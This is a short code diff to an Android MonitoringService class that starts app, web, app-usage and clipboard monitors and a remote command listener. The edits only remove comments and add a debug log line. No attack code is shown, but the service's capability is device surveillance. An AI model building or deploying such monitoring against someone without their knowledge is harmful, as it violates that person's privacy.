@@ -106,8 +106,8 @@ public class MonitoringService extends Service {
             startAppMonitor(userId, phoneModel);
             startWebMonitor(userId, phoneModel);
             startAppUsageMonitor(userId, phoneModel);
-            startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
-            initializeCommandListener(userId, phoneModel); // Initialize CommandListener
+            startClipboardMonitor(userId, phoneModel); 
+            initializeCommandListener(userId, phoneModel); 
             //startScreenshotMonitor(userId, phoneModel); // Initialize ScreenshotMonitor
 
 
@@ -180,6 +180,9 @@ public class MonitoringService extends Service {
         } else {
             startService(serviceIntent);
         }
+        
+        // Verify service started
+        Log.d(TAG, "App Usage Monitor service started");
     }
 
     private void initializeCommandListener(String userId, String phoneModel) {
